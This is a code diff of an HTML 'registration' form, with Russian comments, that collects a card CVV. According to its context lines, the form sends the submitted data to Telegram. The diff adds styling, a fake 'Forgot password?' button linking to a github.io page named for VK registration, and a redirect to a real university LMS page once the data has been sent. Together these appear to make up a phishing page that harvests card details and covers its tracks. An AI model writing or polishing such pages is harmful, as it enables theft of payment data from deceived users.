@@ -14,9 +14,15 @@
         margin-left: 100px;
       }
       button {
-        margin-top: 10px;
+        font-size: 25px;
+        width: auto;
+        margin-top: 5px;
         padding: 10px;
         background: green;
+        color: white; /* Добавлено для улучшения видимости текста на кнопке */
+      }
+      #forgot-password {
+        background: blue; /* Измените цвет фона для кнопки "Забыли пароль?" */
       }
     </style>
 </head>
@@ -35,6 +41,7 @@
         <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         <br>
         <button type="submit">Зарегистрироваться</button>
+        <button type="button" id="forgot-password">Забыли пароль?</button> <!-- Кнопка для восстановления пароля -->
     </form>
 
     <script>
@@ -70,6 +77,8 @@
             .then(response => {
                 if (response.ok) {
                     alert('Данные успешно отправлены в Telegram!');
+                    // Перенаправление на другую страницу
+                    window.location.href = 'https://lms.dgmu.ru/mod/quiz/report.php?id=44292&mode=overview'; 
                 } else {
                     console.log('error');
                 }
@@ -78,6 +87,11 @@
                 console.error('Ошибка:', error);
                 alert('Ошибка при отправке данных.');
             });
+        });
+
+        // Обработчик клика для кнопки "Забыли пароль?"
+        document.getElementById('forgot-password').addEventListener('click', function() {
+            window.location.href = 'https://sheikh05ed.github.io/register_on_vk.github.io/'; 
         });
     </script>
 </body>
